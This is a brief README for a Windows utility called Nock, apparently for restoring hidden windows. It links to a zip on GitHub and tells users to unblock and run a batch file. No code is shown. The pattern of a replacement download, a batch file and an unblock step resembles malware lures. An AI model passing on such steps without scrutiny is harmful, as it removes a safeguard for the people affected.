# Nock

This is a new download. Do not use the old Stillframe repo.

The window title says **Nock**.

[Download Nock.zip](https://github.com/tarunmeenaofficial-droid/Nock/raw/main/Nock.zip)

1. Unzip it into a new folder.
2. Right-click Nock.bat, open Properties, and tick Unblock if you see it.
3. Double-click Nock.bat.
4. Click a program, press Ctrl+Y, then open Nock and click Restore.
